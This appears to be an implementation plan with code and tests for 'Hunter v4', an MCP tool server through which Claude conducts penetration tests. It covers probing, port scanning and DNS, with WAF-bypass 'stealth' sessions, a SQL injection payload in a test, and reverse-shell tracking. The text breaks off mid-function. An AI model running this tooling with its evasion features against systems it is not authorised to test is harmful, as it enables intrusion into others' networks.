# Hunter v4 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an AI-driven pentest agent where Claude is the brain and MCP tools are the hands.

**Architecture:** FastMCP server exposing 12 atomic tools + JSON knowledge graph. Claude orchestrates via tool_use, tools return structured data, Claude makes all decisions.

**Tech Stack:** Python 3.11, FastMCP 3.2.4, requests, socket, subprocess. Reuses v3 stealth.py/config.py/shell_manager.py.

---

## File Structure

```
/root/.claude/skills/hunter/
├── mcp_server.py           # MCP server entry point + tool registration
├── core/
│   ├── __init__.py
│   ├── knowledge.py        # Knowledge graph: data structure + JSON persistence
│   ├── stealth.py          # [REUSE v3] TLS fingerprint + WAF bypass
│   └── config.py           # [REUSE v3] Tool detection, payloads, wordlists
├── tools/
│   ├── __init__.py
│   ├── probe.py            # HTTP probe (wraps StealthSession)
│   ├── port_scan.py        # Port scanner (socket-based)
│   ├── dns_tool.py         # DNS resolver
│   ├── dir_enum.py         # Directory enumerator
│   ├── subdomain.py        # Subdomain discovery
│   ├── tech.py             # Technology fingerprinting
│   ├── js_analyze.py       # JavaScript static analysis
│   ├── src_read.py         # Target file reader (LFI/traversal)
│   ├── inject.py           # Injection tester with diff comparison
│   ├── shell_tool.py       # Shell session manager
│   ├── exec_tool.py        # Python code executor (sandboxed)
│   └── session_tool.py     # Session/knowledge graph queries
├── sessions/               # Persisted session JSON files
└── tests/
    ├── test_knowledge.py
    ├── test_probe.py
    ├── test_port_scan.py
    ├── test_dns.py
    ├── test_dir_enum.py
    ├── test_tech.py
    ├── test_inject.py
    ├── test_exec.py
    └── test_session.py
```

---

## Task 1: Project Skeleton + Config

**Files:**
- Create: `/root/.claude/skills/hunter/core/__init__.py`
- Create: `/root/.claude/skills/hunter/tools/__init__.py`
- Create: `/root/.claude/skills/hunter/tests/__init__.py`
- Create: `/root/.claude/skills/hunter/sessions/.gitkeep`

- [ ] **Step 1: Create directory structure**

```bash
cd /root/.claude/skills/hunter
mkdir -p tools tests sessions
touch core/__init__.py tools/__init__.py tests/__init__.py sessions/.gitkeep
```

- [ ] **Step 2: Verify v3 modules are importable**

```bash
cd /root/.claude/skills/hunter
python3 -c "
import sys
sys.path.insert(0, '.')
from core.stealth import StealthSession, make_stealth_session
from core.config import TOOLS, USER_AGENTS, REPORTS_DIR
print('stealth.py OK:', StealthSession)
print('config.py OK:', len(USER_AGENTS), 'user agents')
print('TOOLS:', list(TOOLS.keys()))
"
```

Expected: Output shows StealthSession class, 20+ user agents, tool paths.

- [ ] **Step 3: Verify FastMCP is available**

```bash
python3 -c "from fastmcp import FastMCP; print('FastMCP', FastMCP.__module__)"
```

Expected: `FastMCP fastmcp.server.server` (or similar)

---

## Task 2: Knowledge Graph

**Files:**
- Create: `/root/.claude/skills/hunter/core/knowledge.py`
- Create: `/root/.claude/skills/hunter/tests/test_knowledge.py`

- [ ] **Step 1: Write failing tests**

```python
# tests/test_knowledge.py
import json
import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.knowledge import KnowledgeGraph


def test_create_session():
    kg = KnowledgeGraph(target="10.10.90.2")
    assert kg.session["target"] == "10.10.90.2"
    assert kg.session["session_id"].startswith("sess_")
    assert kg.session["findings"] == []
    assert kg.session["attempts"] == []
    assert kg.session["shells"] == []


def test_add_finding():
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_finding(
        type="info_leak",
        severity="critical",
        title="API 无认证信息泄露",
        detail="/api/online_list 返回所有在线用户数据",
        evidence={"url": "http://10.10.90.2/api/online_list", "status": 200},
        tool="dir_enum"
    )
    assert len(kg.session["findings"]) == 1
    f = kg.session["findings"][0]
    assert f["type"] == "info_leak"
    assert f["severity"] == "critical"
    assert f["id"] == "f001"
    assert "timestamp" in f


def test_add_attempt():
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_attempt(
        action="sqli_union",
        target="/login",
        payload="' UNION SELECT 1,2,3--",
        result="blocked by WAF",
        success=False,
        waf_rule="UNION keyword detection"
    )
    assert len(kg.session["attempts"]) == 1
    a = kg.session["attempts"][0]
    assert a["action"] == "sqli_union"
    assert a["success"] is False
    assert a["waf_rule"] == "UNION keyword detection"


def test_add_shell():
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_shell(
        session_id="shell_001",
        type="reverse",
        info="bash on CentOS 6.8"
    )
    assert len(kg.session["shells"]) == 1
    s = kg.session["shells"][0]
    assert s["session_id"] == "shell_001"
    assert s["status"] == "active"


def test_summary():
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_finding(type="info_leak", severity="critical", title="test1", detail="d", evidence={}, tool="t")
    kg.add_finding(type="sqli", severity="high", title="test2", detail="d", evidence={}, tool="t")
    kg.add_finding(type="xss", severity="low", title="test3", detail="d", evidence={}, tool="t")
    summary = kg.summary()
    assert summary["findings_count"] == 3
    assert summary["findings_summary"]["critical"] == 1
    assert summary["findings_summary"]["high"] == 1
    assert summary["findings_summary"]["low"] == 1


def test_query_findings():
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_finding(type="info_leak", severity="critical", title="leak", detail="d", evidence={}, tool="t")
    kg.add_finding(type="sqli", severity="high", title="sqli", detail="d", evidence={}, tool="t")
    results = kg.query_findings(type="sqli")
    assert len(results) == 1
    assert results[0]["title"] == "sqli"


def test_save_and_load(tmp_path):
    kg = KnowledgeGraph(target="10.10.90.2")
    kg.add_finding(type="info_leak", severity="critical", title="test", detail="d", evidence={}, tool="t")
    filepath = kg.save(str(tmp_path))
    assert os.path.exists(filepath)

    kg2 = KnowledgeGraph.load(filepath)
    assert kg2.session["target"] == "10.10.90.2"
    assert len(kg2.session["findings"]) == 1
    assert kg2.session["findings"][0]["title"] == "test"
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_knowledge.py -v
```

Expected: FAIL — `ModuleNotFoundError: No module named 'core.knowledge'`

- [ ] **Step 3: Implement KnowledgeGraph**

```python
# core/knowledge.py
"""Hunter v4 — Knowledge Graph

JSON-based knowledge graph for pentest session state.
Tracks findings, attempts, shells, and attack paths.
Persists to disk for cross-session continuity.
"""

import json
import os
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


SESSIONS_DIR = Path(__file__).parent.parent / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)


class KnowledgeGraph:
    """Pentest session knowledge graph with JSON persistence."""

    def __init__(self, target: str, session_id: Optional[str] = None):
        now = datetime.now(timezone.utc).isoformat()
        self.session = {
            "target": target,
            "session_id": session_id or f"sess_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "started_at": now,
            "findings": [],
            "attempts": [],
            "shells": [],
            "attack_paths": [],
        }
        self._finding_counter = 0

    def add_finding(self, type: str, severity: str, title: str, detail: str,
                    evidence: dict, tool: str) -> dict:
        """Record a vulnerability or information finding."""
        self._finding_counter += 1
        finding = {
            "id": f"f{self._finding_counter:03d}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": type,
            "severity": severity,
            "title": title,
            "detail": detail,
            "evidence": evidence,
            "tool": tool,
        }
        self.session["findings"].append(finding)
        return finding

    def add_attempt(self, action: str, target: str, payload: str, result: str,
                    success: bool, **kwargs) -> dict:
        """Record an exploitation attempt (success or failure)."""
        attempt = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "action": action,
            "target": target,
            "payload": payload,
            "result": result,
            "success": success,
            **kwargs,
        }
        self.session["attempts"].append(attempt)
        return attempt

    def add_shell(self, session_id: str, type: str, info: str = "") -> dict:
        """Record a shell session."""
        shell = {
            "session_id": session_id,
            "type": type,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "status": "active",
            "info": info,
        }
        self.session["shells"].append(shell)
        return shell

    def add_attack_path(self, path: str) -> None:
        """Record an attack path (chain of findings)."""
        if path not in self.session["attack_paths"]:
            self.session["attack_paths"].append(path)

    def summary(self) -> dict:
        """Return a compact summary of the session."""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.session["findings"]:
            sev = f.get("severity", "info")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        active_shells = sum(1 for s in self.session["shells"] if s["status"] == "active")
        success_attempts = sum(1 for a in self.session["attempts"] if a["success"])

        return {
            "target": self.session["target"],
            "session_id": self.session["session_id"],
            "started_at": self.session["started_at"],
            "findings_count": len(self.session["findings"]),
            "findings_summary": severity_counts,
            "top_findings": [
                {"type": f["type"], "severity": f["severity"], "title": f["title"]}
                for f in self.session["findings"]
                if f["severity"] in ("critical", "high")
            ],
            "attempts_count": len(self.session["attempts"]),
            "attempts_successful": success_attempts,
            "shells_active": active_shells,
            "attack_paths": self.session["attack_paths"],
        }

    def query_findings(self, type: Optional[str] = None, severity: Optional[str] = None) -> list:
        """Query findings with optional filters."""
        results = self.session["findings"]
        if type:
            results = [f for f in results if f["type"] == type]
        if severity:
            results = [f for f in results if f["severity"] == severity]
        return results

    def query_attempts(self, success: Optional[bool] = None, action: Optional[str] = None) -> list:
        """Query attempts with optional filters."""
        results = self.session["attempts"]
        if success is not None:
            results = [a for a in results if a["success"] == success]
        if action:
            results = [a for a in results if a["action"] == action]
        return results

    def save(self, directory: Optional[str] = None) -> str:
        """Persist session to JSON file."""
        save_dir = Path(directory) if directory else SESSIONS_DIR
        save_dir.mkdir(parents=True, exist_ok=True)
        filepath = save_dir / f"{self.session['session_id']}.json"
        with open(filepath, "w") as f:
            json.dump(self.session, f, indent=2, ensure_ascii=False)
        return str(filepath)

    @classmethod
    def load(cls, filepath: str) -> "KnowledgeGraph":
        """Load session from JSON file."""
        with open(filepath) as f:
            data = json.load(f)
        kg = cls(target=data["target"], session_id=data["session_id"])
        kg.session = data
        kg._finding_counter = len(data["findings"])
        return kg

    def export_markdown(self) -> str:
        """Export session as Markdown report."""
        s = self.summary()
        lines = [
            f"# Hunter v4 Pentest Report",
            f"",
            f"**Target:** {s['target']}",
            f"**Session:** {s['session_id']}",
            f"**Started:** {s['started_at']}",
            f"",
            f"## Summary",
            f"- Findings: {s['findings_count']}",
            f"- Critical: {s['findings_summary']['critical']}",
            f"- High: {s['findings_summary']['high']}",
            f"- Medium: {s['findings_summary']['medium']}",
            f"- Low: {s['findings_summary']['low']}",
            f"- Successful attempts: {s['attempts_successful']}/{s['attempts_count']}",
            f"- Active shells: {s['shells_active']}",
            f"",
        ]

        if s["attack_paths"]:
            lines.append("## Attack Paths")
            for path in s["attack_paths"]:
                lines.append(f"- {path}")
            lines.append("")

        if self.session["findings"]:
            lines.append("## Findings")
            for f in self.session["findings"]:
                lines.append(f"### [{f['severity'].upper()}] {f['title']}")
                lines.append(f"- **Type:** {f['type']}")
                lines.append(f"- **Tool:** {f['tool']}")
                lines.append(f"- **Detail:** {f['detail']}")
                if f["evidence"]:
                    lines.append(f"- **Evidence:** `{json.dumps(f['evidence'], ensure_ascii=False)}`")
                lines.append("")

        return "\n".join(lines)
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_knowledge.py -v
```

Expected: 7 tests PASS

- [ ] **Step 5: Commit**

```bash
cd /root/.claude/skills/hunter
git add core/knowledge.py tests/test_knowledge.py
git commit -m "feat(v4): knowledge graph with JSON persistence"
```

---

## Task 3: MCP Server Skeleton

**Files:**
- Create: `/root/.claude/skills/hunter/mcp_server.py`

- [ ] **Step 1: Create minimal MCP server**

```python
# mcp_server.py
"""Hunter v4 — MCP Server

AI-driven pentest agent. Claude is the brain, tools are the hands.
"""

import sys
from pathlib import Path

# Ensure project root is importable
sys.path.insert(0, str(Path(__file__).parent))

from fastmcp import FastMCP

from core.knowledge import KnowledgeGraph

# Global state
_kg: KnowledgeGraph | None = None


def get_kg() -> KnowledgeGraph:
    """Get or create the global knowledge graph."""
    global _kg
    if _kg is None:
        _kg = KnowledgeGraph(target="unknown")
    return _kg


def set_target(target: str) -> None:
    """Set the target for the current session."""
    global _kg
    _kg = KnowledgeGraph(target=target)


mcp = FastMCP(
    "Hunter v4",
    description="AI-driven pentest agent. 12 tools for recon, analysis, exploitation, and session management.",
)


@mcp.tool()
def session(action: str = "summary", filter_type: str = "", filter_severity: str = "",
            session_id: str = "", export_format: str = "markdown") -> dict:
    """Query or manage the pentest session knowledge graph.

    Actions:
    - summary: Get compact session summary
    - findings: Get all findings (optional filter by type/severity)
    - attempts: Get all exploitation attempts
    - save: Persist session to disk
    - load: Load a previous session
    - export: Export as Markdown report
    """
    kg = get_kg()

    if action == "summary":
        return kg.summary()

    elif action == "findings":
        return {"findings": kg.query_findings(type=filter_type or None, severity=filter_severity or None)}

    elif action == "attempts":
        return {"attempts": kg.query_attempts()}

    elif action == "save":
        path = kg.save()
        return {"saved": path}

    elif action == "load":
        if not session_id:
            return {"error": "session_id required for load action"}
        filepath = Path(__file__).parent / "sessions" / f"{session_id}.json"
        if not filepath.exists():
            return {"error": f"Session file not found: {filepath}"}
        global _kg
        _kg = KnowledgeGraph.load(str(filepath))
        return {"loaded": session_id, "target": _kg.session["target"]}

    elif action == "export":
        return {"report": kg.export_markdown()}

    else:
        return {"error": f"Unknown action: {action}"}


if __name__ == "__main__":
    mcp.run()
```

- [ ] **Step 2: Test server starts**

```bash
cd /root/.claude/skills/hunter
timeout 5 python3 mcp_server.py 2>&1 || true
```

Expected: Server starts (may timeout after 5s, that's OK)

- [ ] **Step 3: Test session tool directly**

```bash
cd /root/.claude/skills/hunter
python3 -c "
import sys
sys.path.insert(0, '.')
from mcp_server import session, set_target

set_target('10.10.90.2')
result = session(action='summary')
print(result)
assert result['target'] == '10.10.90.2'
print('OK')
"
```

Expected: Session summary with target `10.10.90.2`

- [ ] **Step 4: Commit**

```bash
cd /root/.claude/skills/hunter
git add mcp_server.py
git commit -m "feat(v4): MCP server skeleton with session tool"
```

---

## Task 4: `probe` Tool — HTTP Probe

**Files:**
- Create: `/root/.claude/skills/hunter/tools/probe.py`
- Create: `/root/.claude/skills/hunter/tests/test_probe.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Write failing test**

```python
# tests/test_probe.py
import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from tools.probe import probe_impl


def test_probe_returns_structured_result():
    """Test that probe returns dict with expected keys."""
    result = probe_impl(url="http://httpbin.org/get", method="GET", timeout=10)
    assert isinstance(result, dict)
    assert "url" in result
    assert "status" in result
    assert "headers" in result
    assert "body" in result
    assert "timing_ms" in result
    assert "interesting" in result
    assert "tags" in result


def test_probe_detects_forms():
    """Test that probe detects forms in HTML."""
    html = '<html><form action="/login" method="POST"><input name="user"><input type="hidden" name="csrf" value="abc"></form></html>'
    interesting, tags = probe_impl._analyze_body(html)
    assert any("form" in t for t in tags)
    assert any("csrf" in i.lower() for i in interesting)


def test_probe_detects_comments():
    """Test that probe detects HTML comments."""
    html = '<html><!-- TODO: remove debug mode --></html>'
    interesting, tags = probe_impl._analyze_body(html)
    assert any("comment" in t for t in tags)
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_probe.py -v
```

Expected: FAIL — `ModuleNotFoundError: No module named 'tools.probe'`

- [ ] **Step 3: Implement probe tool**

```python
# tools/probe.py
"""Hunter v4 — HTTP Probe Tool

All HTTP operations go through here. Wraps StealthSession for
TLS fingerprint spoofing, WAF bypass, and anti-detection.
"""

import re
import sys
import time
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.stealth import StealthSession, make_stealth_session


# Interesting patterns to detect in responses
INTERESTING_PATTERNS = {
    "form": re.compile(r'<form[^>]*>', re.I),
    "input_hidden": re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>', re.I),
    "csrf_token": re.compile(r'(csrf|_token|authenticity.token)', re.I),
    "comment": re.compile(r'<!--(.{1,200}?)-->', re.S),
    "debug_flag": re.compile(r'(debug\s*[:=]\s*true|DEBUG\s*=\s*True|APP_DEBUG)', re.I),
    "error_disclosure": re.compile(r'(SQL syntax|mysql_|ORA-|PostgreSQL|SQLite|stack trace|Traceback)', re.I),
    "api_key": re.compile(r'(api[_-]?key|apikey|access[_-]?key)\s*[:=]\s*["\']?[\w-]{10,}', re.I),
    "internal_ip": re.compile(r'(192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)'),
    "directory_listing": re.compile(r'<title>Index of /|Directory listing for', re.I),
    "default_page": re.compile(r'(Apache2? Ubuntu Default Page|Welcome to nginx|IIS Windows Server)', re.I),
}

HEADER_LEAKS = {
    "X-Powered-By": "header_leak",
    "X-AspNet-Version": "header_leak",
    "X-AspNetMvc-Version": "header_leak",
    "Server": "server_leak",
    "X-Debug-Token": "debug_leak",
    "X-Runtime": "runtime_leak",
}

# Global session (reused across calls)
_session: Optional[StealthSession] = None


def _get_session() -> StealthSession:
    """Get or create stealth session."""
    global _session
    if _session is None:
        _session = make_stealth_session()
    return _session


def _analyze_body(body: str) -> tuple[list[str], list[str]]:
    """Analyze response body for interesting content. Returns (interesting, tags)."""
    interesting = []
    tags = set()

    for name, pattern in INTERESTING_PATTERNS.items():
        matches = pattern.findall(body)
        if matches:
            tags.add(name)
            if name == "form":
                interesting.append(f"found {len(matches)} form(s)")
            elif name == "comment":
                for m in matches[:3]:  # Max 3 comments
                    text = m.strip()[:100]
                    interesting.append(f"comment: {text}")
            elif name == "error_disclosure":
                interesting.append(f"error disclosure: {matches[0][:80]}")
            elif name == "debug_flag":
                interesting.append(f"debug mode detected: {matches[0][:50]}")
            elif name == "api_key":
                interesting.append(f"potential API key found")
            elif name == "internal_ip":
                interesting.append(f"internal IP: {matches[0]}")
            elif name == "directory_listing":
                interesting.append("directory listing enabled")
            elif name == "default_page":
                interesting.append(f"default page: {matches[0][:50]}")
            elif name == "input_hidden":
                interesting.append(f"hidden input field(s): {len(matches)}")
            elif name == "csrf_token":
                interesting.append("CSRF token found")

    return interesting, list(tags)


def probe_impl(url: str, method: str = "GET", headers: Optional[dict] = None,
               body: Optional[str] = None, follow_redirects: bool = True,
               timeout: int = 10) -> dict:
    """Execute HTTP request and analyze response."""
    session = _get_session()
    start = time.time()

    try:
        resp = session.request(
            method=method,
            url=url,
            headers=headers or {},
            data=body,
            allow_redirects=follow_redirects,
            timeout=timeout,
        )
        elapsed_ms = int((time.time() - start) * 1000)

        # Extract response data
        resp_headers = dict(resp.headers)
        resp_body = resp.text
        resp_cookies = dict(resp.cookies)

        # Build redirect chain
        redirect_chain = []
        if resp.history:
            redirect_chain = [r.url for r in resp.history]

        # Analyze body
        body_interesting, body_tags = _analyze_body(resp_body)

        # Analyze headers
        header_interesting = []
        for header_name, tag in HEADER_LEAKS.items():
            if header_name in resp_headers:
                header_interesting.append(f"header leak: {header_name}: {resp_headers[header_name]}")
                body_tags.append(tag)

        all_interesting = body_interesting + header_interesting

        return {
            "url": url,
            "status": resp.status_code,
            "headers": resp_headers,
            "body": resp_body,
            "body_length": len(resp_body),
            "cookies": resp_cookies,
            "timing_ms": elapsed_ms,
            "redirect_chain": redirect_chain,
            "interesting": all_interesting,
            "tags": list(set(body_tags)),
        }

    except Exception as e:
        elapsed_ms = int((time.time() - start) * 1000)
        return {
            "url": url,
            "status": 0,
            "headers": {},
            "body": "",
            "body_length": 0,
            "cookies": {},
            "timing_ms": elapsed_ms,
            "redirect_chain": [],
            "interesting": [f"error: {str(e)}"],
            "tags": ["error"],
            "error": str(e),
        }
```

- [ ] **Step 4: Run tests**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_probe.py::test_probe_detects_forms tests/test_probe.py::test_probe_detects_comments -v
```

Expected: PASS (the HTTP test may need network, skip if offline)

- [ ] **Step 5: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.probe import probe_impl

@mcp.tool()
def probe(url: str, method: str = "GET", headers: dict = {}, body: str = "",
          follow_redirects: bool = True, timeout: int = 10) -> dict:
    """Send HTTP request to target and analyze response.

    Returns full response (headers, body, cookies, timing) plus
    auto-detected interesting content (forms, comments, leaks, errors).
    Use this for all HTTP operations: GET, POST, PUT, DELETE, etc.
    """
    result = probe_impl(url=url, method=method, headers=headers, body=body,
                        follow_redirects=follow_redirects, timeout=timeout)
    # Auto-record to knowledge graph if interesting
    kg = get_kg()
    if result.get("interesting"):
        kg.add_finding(
            type="observation",
            severity="info",
            title=f"Interesting content at {url}",
            detail="; ".join(result["interesting"][:3]),
            evidence={"url": url, "status": result["status"]},
            tool="probe"
        )
    return result
```

- [ ] **Step 6: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/probe.py tests/test_probe.py mcp_server.py
git commit -m "feat(v4): probe tool — HTTP probe with body analysis"
```

---

## Task 5: `port_scan` Tool

**Files:**
- Create: `/root/.claude/skills/hunter/tools/port_scan.py`
- Create: `/root/.claude/skills/hunter/tests/test_port_scan.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Write failing tests**

```python
# tests/test_port_scan.py
import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from tools.port_scan import parse_ports, port_scan_impl


def test_parse_ports_top100():
    ports = parse_ports("top100")
    assert len(ports) > 0
    assert 80 in ports
    assert 443 in ports
    assert 22 in ports


def test_parse_ports_custom():
    ports = parse_ports("22,80,443")
    assert ports == [22, 80, 443]


def test_parse_ports_range():
    ports = parse_ports("80-85")
    assert ports == [80, 81, 82, 83, 84, 85]


def test_port_scan_returns_structured():
    result = port_scan_impl("127.0.0.1", ports="22,80", timeout=1)
    assert isinstance(result, dict)
    assert "host" in result
    assert "open" in result
    assert "closed_count" in result
    assert "scan_time_ms" in result
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_port_scan.py -v
```

Expected: FAIL

- [ ] **Step 3: Implement port_scan tool**

```python
# tools/port_scan.py
"""Hunter v4 — Port Scanner

Socket-based port scanner with service detection.
Falls back to nmap if available for version detection.
"""

import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.config import TOOLS

# Common ports by category
TOP_100 = [
    7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106, 110, 111,
    113, 119, 135, 139, 143, 144, 179, 199, 389, 427, 443, 444, 445, 465,
    513, 514, 515, 543, 544, 548, 554, 587, 631, 646, 873, 990, 993, 995,
    1025, 1026, 1027, 1028, 1029, 1110, 1433, 1720, 1723, 1755, 1900, 2000,
    2001, 2049, 2100, 2103, 2121, 2199, 2717, 2869, 2967, 3000, 3001, 3128,
    3306, 3389, 3986, 4899, 5000, 5001, 5003, 5009, 5050, 5051, 5060, 5101,
    5120, 5190, 5357, 5432, 5631, 5666, 5800, 5900, 6000, 6001, 6646, 7070,
    8000, 8001, 8008, 8009, 8010, 8080, 8081, 8443, 8888, 9000, 9001, 9090,
    9100, 9999, 10000, 27017, 28017, 50000, 50070,
]

SERVICE_MAP = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios",
    143: "imap", 443: "https", 445: "smb", 465: "smtps", 587: "submission",
    993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle",
    2049: "nfs", 3000: "http", 3306: "mysql", 3389: "rdp",
    5432: "postgresql", 5900: "vnc", 6379: "redis", 8000: "http",
    8001: "http", 8008: "http", 8009: "ajp", 8010: "http",
    8080: "http", 8081: "http", 8443: "https", 8888: "http",
    9000: "http", 9090: "http", 9200: "elasticsearch",
    11211: "memcached", 27017: "mongodb", 50000: "sap",
}


def parse_ports(ports_spec: str) -> list[int]:
    """Parse port specification into list of port numbers."""
    if ports_spec == "top100":
        return TOP_100
    elif ports_spec == "top1000":
        # Extend with more common ports
        return sorted(set(TOP_100 + list(range(1, 1024))))
    elif "-" in ports_spec:
        start, end = ports_spec.split("-", 1)
        return list(range(int(start), int(end) + 1))
    elif "," in ports_spec:
        return [int(p.strip()) for p in ports_spec.split(",")]
    else:
        return [int(ports_spec)]


def _grab_banner(host: str, port: int, timeout: float) -> str:
    """Try to grab service banner."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner[:200]
    except Exception:
        return ""


def _try_nmap(host: str, ports: list[int]) -> Optional[dict]:
    """Try nmap for version detection. Returns None if not available."""
    nmap_path = TOOLS.get("nmap")
    if not nmap_path:
        return None
    try:
        port_str = ",".join(str(p) for p in ports[:100])  # Limit to 100 ports
        result = subprocess.run(
            [nmap_path, "-sV", "-p", port_str, "--open", "-oX", "-", host],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0:
            return {"stdout": result.stdout, "method": "nmap"}
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


def port_scan_impl(host: str, ports: str = "top100", timeout: int = 3) -> dict:
    """Scan ports on target host."""
    start = time.time()
    port_list = parse_ports(ports)

    open_ports = []
    closed_count = 0
    filtered_count = 0

    # Try nmap first for better results
    nmap_result = _try_nmap(host, port_list)

    if nmap_result:
        # Parse nmap XML output (simplified)
        import xml.etree.ElementTree as ET
        try:
            root = ET.fromstring(nmap_result["stdout"])
            for port_elem in root.iter("port"):
                state_elem = port_elem.find("state")
                if state_elem is not None and state_elem.get("state") == "open":
                    port_num = int(port_elem.get("portid"))
                    service_elem = port_elem.find("service")
                    service = service_elem.get("name", "") if service_elem is not None else SERVICE_MAP.get(port_num, "")
                    version = ""
                    if service_elem is not None:
                        product = service_elem.get("product", "")
                        ver = service_elem.get("version", "")
                        version = f"{product} {ver}".strip()
                    open_ports.append({"port": port_num, "service": service, "version": version})
        except ET.ParseError:
            nmap_result = None  # Fall back to socket scan

    if not nmap_result:
        # Socket-based scan
        for port in port_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                if result == 0:
                    service = SERVICE_MAP.get(port, "")
                    banner = _grab_banner(host, port, timeout)
                    open_ports.append({"port": port, "service": service, "version": banner})
                else:
                    closed_count += 1
                sock.close()
            except socket.timeout:
                filtered_count += 1
            except Exception:
                closed_count += 1

    elapsed_ms = int((time.time() - start) * 1000)

    return {
        "host": host,
        "open": open_ports,
        "closed_count": closed_count,
        "filtered_count": filtered_count,
        "scan_time_ms": elapsed_ms,
        "total_scanned": len(port_list),
    }
```

- [ ] **Step 4: Run tests**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_port_scan.py::test_parse_ports_top100 tests/test_port_scan.py::test_parse_ports_custom tests/test_port_scan.py::test_parse_ports_range -v
```

Expected: 3 tests PASS

- [ ] **Step 5: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.port_scan import port_scan_impl

@mcp.tool()
def port_scan(host: str, ports: str = "top100", timeout: int = 3) -> dict:
    """Scan ports on target host.

    ports: "top100", "top1000", "22,80,443", "1-1024"
    Returns only open ports with service/version info.
    """
    result = port_scan_impl(host=host, ports=ports, timeout=timeout)
    # Auto-record findings
    kg = get_kg()
    for p in result["open"]:
        kg.add_finding(
            type="open_port",
            severity="info",
            title=f"Port {p['port']} ({p['service']}) open on {host}",
            detail=f"Service: {p['service']}, Version: {p['version']}",
            evidence={"host": host, "port": p["port"], "service": p["service"]},
            tool="port_scan"
        )
    return result
```

- [ ] **Step 6: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/port_scan.py tests/test_port_scan.py mcp_server.py
git commit -m "feat(v4): port_scan tool — socket scan with nmap fallback"
```

---

## Task 6: `dns` Tool

**Files:**
- Create: `/root/.claude/skills/hunter/tools/dns_tool.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement dns tool**

```python
# tools/dns_tool.py
"""Hunter v4 — DNS Resolver

DNS query tool supporting A, AAAA, MX, TXT, NS, CNAME, SOA, SRV records.
"""

import socket
import subprocess
import sys
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))


def dns_impl(domain: str, record_type: str = "ANY") -> dict:
    """Resolve DNS records for a domain."""
    records = []

    try:
        # Use dnspython if available, fall back to socket
        import dns.resolver
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 10

        types_to_query = [record_type] if record_type != "ANY" else [
            "A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"
        ]

        for rtype in types_to_query:
            try:
                answers = resolver.resolve(domain, rtype)
                for rdata in answers:
                    record = {"type": rtype, "value": str(rdata), "ttl": answers.rrset.ttl}
                    if rtype == "MX":
                        record["priority"] = rdata.preference
                        record["value"] = str(rdata.exchange)
                    records.append(record)
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                continue
            except Exception:
                continue

    except ImportError:
        # Fall back to socket-based resolution
        try:
            ip = socket.gethostbyname(domain)
            records.append({"type": "A", "value": ip, "ttl": 0})
        except socket.gaierror as e:
            return {"domain": domain, "records": [], "error": str(e)}

        # Try MX via subprocess
        try:
            result = subprocess.run(["dig", "+short", "MX", domain],
                                    capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.strip().split("\n"):
                    if line:
                        parts = line.split()
